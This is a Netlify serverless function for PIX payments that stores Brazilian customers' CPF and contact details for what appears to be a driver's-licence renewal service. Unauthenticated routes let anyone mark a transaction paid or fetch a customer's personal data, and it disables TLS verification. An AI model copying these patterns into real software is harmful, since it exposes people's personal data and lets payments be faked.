const { Pool } = require("pg");
const { getStore } = require("@netlify/blobs");

const CORS_HEADERS = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "Content-Type, Authorization",
  "Access-Control-Allow-Methods": "GET,POST,OPTIONS"
};

const CONNECTION_STRING =
  process.env.NETLIFY_DATABASE_URL ||
  process.env.NETLIFY_DATABASE_URL_UNBRANDED ||
  process.env.DATABASE_URL ||
  "";

let pool;
function getPool() {
  if (!pool) {
    pool = new Pool({
      connectionString: CONNECTION_STRING,
      ssl: { rejectUnauthorized: false },
      max: 1,
      connectionTimeoutMillis: 8000
    });
  }
  return pool;
}

async function query(text, params = []) {
  const client = await getPool().connect();
  try {
    const result = await client.query(text, params);
    return result.rows || [];
  } finally {
    client.release();
  }
}

function statusStore() {
  return getStore({ name: "pix_transactions", consistency: "strong" });
}

// Estado de pagamento duravel (Blobs). Sobrevive a reinicios e funciona
// mesmo quando o Postgres nao esta acessivel no contexto atual.
async function blobGet(id) {
  try {
    const value = await statusStore().get(id, { type: "json" });
    return value || null;
  } catch (err) {
    console.error("blob get failed:", String(err).slice(0, 300));
    return null;
  }
}

async function blobPut(id, record) {
  try {
    await statusStore().setJSON(id, record);
    return true;
  } catch (err) {
    console.error("blob put failed:", String(err).slice(0, 300));
    return false;
  }
}

function json(statusCode, payload) {
  return {
    statusCode,
    headers: { "Content-Type": "application/json; charset=utf-8", ...CORS_HEADERS },
    body: JSON.stringify(payload)
  };
}

function normalizeCpf(value) {
  return String(value || "").replace(/\D/g, "");
}

function randomId(prefix, length = 8) {
  const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789";
  let out = "";
  for (let i = 0; i < length; i += 1) {
    out += alphabet[Math.floor(Math.random() * alphabet.length)];
  }
  return `${prefix}${Date.now()}_${out}`;
}

function pixPayloadField(id, value, size) {
  const text = String(value || "").slice(0, size);
  return id + String(text.length).padStart(2, "0") + text;
}

function crc16(payload) {
  let crc = 0xffff;
  for (let i = 0; i < payload.length; i += 1) {
    crc ^= payload.charCodeAt(i) << 8;
    for (let bit = 0; bit < 8; bit += 1) {
      crc = crc & 0x8000 ? (crc << 1) ^ 0x1021 : crc << 1;
      crc &= 0xffff;
    }
  }
  return crc.toString(16).toUpperCase().padStart(4, "0");
}

function sanitize(text) {
  return String(text || "")
    .normalize("NFD")
    .replace(/[\u0300-\u036f]/g, "")
    .replace(/[^A-Za-z0-9 ]/g, "")
    .trim();
}

function buildStaticPixCode({ key, merchantName, merchantCity, amount, txid }) {
  const mai = pixPayloadField("26", pixPayloadField("00", "br.gov.bcb.pix", 99) + pixPayloadField("01", key, 77), 99);
  const amountText = Number(amount).toFixed(2);
  const additionalData = pixPayloadField("62", pixPayloadField("05", txid || "***", 25), 99);
  let payload =
    pixPayloadField("00", "01", 2) +
    "010212" +
    mai +
    pixPayloadField("52", "0000", 4) +
    pixPayloadField("53", "986", 3) +
    pixPayloadField("54", amountText, 13) +
    pixPayloadField("58", "BR", 2) +
    pixPayloadField("59", sanitize(merchantName) || "RECEBEDOR", 25) +
    pixPayloadField("60", sanitize(merchantCity) || "SAO PAULO", 15) +
    additionalData;
  payload += "6304";
  return payload + crc16(payload);
}

function createDemoPixCode(transactionId, amount) {
  const key = process.env.PIX_KEY || "pix@habilitacaobrasil.example";
  const merchantName = process.env.PIX_MERCHANT_NAME || "RENOVE BRASIL DEMO";
  const merchantCity = process.env.PIX_MERCHANT_CITY || "SAO PAULO";
  return buildStaticPixCode({
    key,
    merchantName,
    merchantCity,
    amount,
    txid: transactionId.replace(/[^A-Za-z0-9]/g, "").slice(0, 25)
  });
}

async function createPixTransaction(body, kind) {
  const amount = Number(body.amount) > 0 ? Number(body.amount) : 95.6;
  const transactionId = randomId("tx");
  const depositId = randomId("dep", 6);

  let pixCode = null;
  let gatewayError = null;

  const gatewayBase = process.env.PIX_API_BASE;
  const gatewayToken = process.env.PIX_API_TOKEN;

  if (gatewayBase && gatewayToken) {
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 12000);
      const resp = await fetch(gatewayBase.replace(/\/$/, "") + "/transactions", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: `Bearer ${gatewayToken}`
        },
        body: JSON.stringify({
          amount: Number(amount.toFixed(2)),
          paymentMethod: "pix",
          callbackUrl: process.env.PIX_CALLBACK_URL || "",
          meta: { transaction_id: transactionId, kind }
        }),
        signal: controller.signal
      });
      clearTimeout(timeout);
      const text = await resp.text();
      let data = {};
      try {
        data = text ? JSON.parse(text) : {};
      } catch {
        data = {};
      }
      const remoteCode = data.pix_code || data.pixCode || data.qr_code || data.qrcode || data.pix || data.copy_paste_code;
      if (resp.ok && remoteCode) {
        pixCode = remoteCode;
      } else {
        gatewayError = data.error || data.message || `HTTP ${resp.status}`;
      }
    } catch (err) {
      gatewayError = String(err);
    }
  }

  if (!pixCode) {
    pixCode = createDemoPixCode(transactionId, amount);
  }

  let persisted = true;
  const record = {
    transaction_id: transactionId,
    deposit_id: depositId,
    kind,
    amount,
    customer_name: String(body.customer_name || "").slice(0, 200),
    customer_email: String(body.customer_email || "").slice(0, 200),
    customer_phone: String(body.customer_phone || "").slice(0, 50),
    customer_cpf: normalizeCpf(body.customer_cpf).slice(0, 11),
    detran_uf: String(body.detran_uf || body.detran || "").slice(0, 10),
    detran_nome: String(body.detran_nome || "").slice(0, 200),
    pix_code: pixCode,
    status: "pending",
    created_at: new Date().toISOString()
  };

  try {
    await query(
      `INSERT INTO pix_transactions
        (transaction_id, deposit_id, kind, amount, customer_name, customer_email,
         customer_phone, customer_cpf, detran_uf, detran_nome, pix_code, status)
       VALUES
        ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, 'pending')`,
      [
        transactionId,
        depositId,
        kind,
        amount,
        record.customer_name,
        record.customer_email,
        record.customer_phone,
        record.customer_cpf,
        record.detran_uf,
        record.detran_nome,
        pixCode
      ]
    );
  } catch (err) {
    persisted = false;
    console.error("pix insert failed:", String(err).slice(0, 500));
  }

  // Sempre grava no Blobs: fonte de verdade do status mesmo sem Postgres.
  await blobPut(transactionId, record);
  await blobPut(depositId, { ...record, is_deposit_id: true });

  return {
    success: true,
    transaction_id: transactionId,
    deposit_id: depositId,
    amount,
    status: "pending",
    pix_code: pixCode,
    qr_code: null,
    gateway_error: gatewayError || undefined,
    persisted
  };
}

async function markPaid(id, bankTxId) {
  const paidRecord = { status: "paid", approved_at: new Date().toISOString(), bank_tx_id: bankTxId || null };
  let blobFound = false;

  try {
    await query(
      `UPDATE pix_transactions
       SET status = 'paid', approved_at = NOW(), bank_tx_id = COALESCE(NULLIF($1, ''), bank_tx_id)
       WHERE (transaction_id = $2 OR deposit_id = $2) AND status <> 'paid'`,
      [String(bankTxId || "").slice(0, 100), id]
    );
  } catch (err) {
    console.error("pg markPaid failed:", String(err).slice(0, 300));
  }

  for (const key of [id]) {
    const existing = await blobGet(key);
    if (existing) {
      await blobPut(key, { ...existing, ...paidRecord });
      blobFound = true;
    }
  }
  if (!blobFound) {
    // Transacao criada antes do Blobs ou gravacao original falhou: registra marcador.
    await blobPut(id, { transaction_id: id, ...paidRecord, status_only: true });
  }
}

async function getTransactionStatus(id) {
  let rows = [];
  try {
    rows = await query(
      `SELECT transaction_id, deposit_id, status, bank_tx_id, kind, amount, created_at
       FROM pix_transactions
       WHERE transaction_id = $1 OR deposit_id = $1
       LIMIT 1`,
      [id]
    );
  } catch (err) {
    console.error("pix status query failed:", String(err).slice(0, 500));
  }

  const tx = rows && rows[0];
  if (!tx) {
    // Postgres indisponivel/sem registro: consulta o Blobs.
    const rec = await blobGet(id);
    if (!rec) {
      return json(404, { success: false, error: "Transaction not found" });
    }
    const payload = {
      success: true,
      status: rec.status,
      transaction_id: rec.transaction_id || id,
      deposit_id: rec.deposit_id || id,
      bank_tx_id: rec.bank_tx_id || undefined
    };
    if (rec.status === "paid") {
      payload.fire_google_ads = true;
    }
    return json(200, payload);
  }

  // Se o Postgres ainda esta pendente mas o Blobs marca pago, o Blobs vence.
  if (tx.status !== "paid") {
    const rec = await blobGet(id);
    if (rec && rec.status === "paid") {
      return json(200, {
        success: true,
        status: "paid",
        transaction_id: tx.transaction_id,
        deposit_id: tx.deposit_id,
        bank_tx_id: rec.bank_tx_id || undefined,
        fire_google_ads: true
      });
    }
  }

  const payload = {
    success: true,
    status: tx.status,
    transaction_id: tx.transaction_id,
    deposit_id: tx.deposit_id,
    bank_tx_id: tx.bank_tx_id || undefined
  };
  if (tx.status === "paid") {
    payload.fire_google_ads = true;
  }
  return json(200, payload);
}

async function readJsonBody(bodyString) {
  if (!bodyString) return {};
  try {
    return JSON.parse(bodyString);
  } catch {
    return {};
  }
}

exports.handler = async (event) => {
  if (event.httpMethod === "OPTIONS") {
    return { statusCode: 204, headers: CORS_HEADERS, body: "" };
  }

  const path = event.path || "";

  // POST /api/payment/payment.php | payment_second.php | payment_fixo.php
  if (event.httpMethod === "POST" && /^\/api\/payment\/(payment|payment_second|payment_fixo)\.php$/.test(path)) {
    const body = await readJsonBody(event.body);
    if (!body || typeof body !== "object") {
      return json(400, { success: false, error: "Invalid JSON payload" });
    }
    const kind = path.replace("/api/payment/", "").replace(".php", "");
    try {
      const result = await createPixTransaction(body, kind);
      return json(200, result);
    } catch (err) {
      return json(500, { success: false, error: "Falha ao gerar PIX", details: String(err) });
    }
  }

  // GET /api/payment/status/status.php?id=...
  if (event.httpMethod === "GET" && path === "/api/payment/status/status.php") {
    const id = String((event.queryStringParameters && event.queryStringParameters.id) || "").trim();
    if (!id) {
      return json(400, { success: false, error: "Informe o id da transacao" });
    }
    try {
      return await getTransactionStatus(id);
    } catch (err) {
      return json(500, { success: false, error: "Erro ao consultar status", details: String(err) });
    }
  }

  // POST /api/notify-approved
  if (event.httpMethod === "POST" && path === "/api/notify-approved") {
    const body = await readJsonBody(event.body);
    const id = String(body.id || body.transaction_id || body.deposit_id || "").trim();
    if (id) {
      await markPaid(id, String(body.bank_tx_id || "").slice(0, 100));
    }
    return json(200, {
      success: true,
      message: "Notificacao de aprovacao registrada",
      transaction_id: id || undefined
    });
  }

  // POST /api/comprovantes/upload.php (multipart form-data)
  if (event.httpMethod === "POST" && path === "/api/comprovantes/upload.php") {
    const contentType = String(event.headers["content-type"] || event.headers["Content-Type"] || "");
    let transactionId = "";
    let customerName = "";
    let customerCpf = "";
    let customerEmail = "";

    if (contentType.includes("multipart/form-data")) {
      const boundaryMatch = contentType.match(/boundary=(?:"([^"]+)"|([^;]+))/);
      const boundary = boundaryMatch ? (boundaryMatch[1] || boundaryMatch[2]).trim() : null;
      if (boundary && event.body) {
        const buffer = event.isBase64Encoded ? Buffer.from(event.body, "base64") : Buffer.from(event.body, "utf8");
        const parts = buffer.toString("latin1").split(`--${boundary}`);
        for (const part of parts) {
          const nameMatch = part.match(/name="([^"]+)"/);
          if (!nameMatch) continue;
          const name = nameMatch[1];
          const headerEnd = part.indexOf("\r\n\r\n");
          if (headerEnd === -1) continue;
          const value = part.slice(headerEnd + 4).replace(/\r\n--\s*$/, "").replace(/\r\n$/, "");
          const latin = Buffer.from(value, "latin1").toString("utf8");
          if (name === "transaction_id") transactionId = latin.trim();
          if (name === "customer_name") customerName = latin.trim();
          if (name === "customer_cpf") customerCpf = latin.trim();
          if (name === "customer_email") customerEmail = latin.trim();
        }
      }
    }

    if (!transactionId) {
      return json(400, { success: false, error: "transaction_id e obrigatorio" });
    }

    await markPaid(transactionId, ("comprovante_" + Date.now()).slice(0, 100));
    return json(200, { success: true, message: "Comprovante recebido", transaction_id: transactionId });
  }

  // GET /api/transaction/:id
  const transactionMatch = path.match(/^\/api\/transaction\/([^/]+)$/);
  if (event.httpMethod === "GET" && transactionMatch) {
    const id = decodeURIComponent(transactionMatch[1]).trim();
    let rows = [];
    try {
      rows = await query(
        `SELECT transaction_id, deposit_id, kind, amount, customer_name, customer_cpf,
                customer_email, customer_phone, pix_code, status, created_at
         FROM pix_transactions
         WHERE transaction_id = $1 OR deposit_id = $1
         LIMIT 1`,
        [id]
      );
    } catch (err) {
      console.error("transaction lookup failed:", String(err).slice(0, 500));
    }
    let tx = rows && rows[0];
    if (!tx) {
      const rec = await blobGet(id);
      if (rec && !rec.status_only) {
        tx = rec;
      }
    }
    if (!tx) {
      return json(404, { success: false, error: "Transacao nao encontrada" });
    }
    return json(200, { success: true, transaction: tx });
  }

  // POST /api/log-access
  if (event.httpMethod === "POST" && path === "/api/log-access") {
    return json(200, { success: true });
  }

  return json(404, { success: false, error: "Rota nao encontrada" });
};
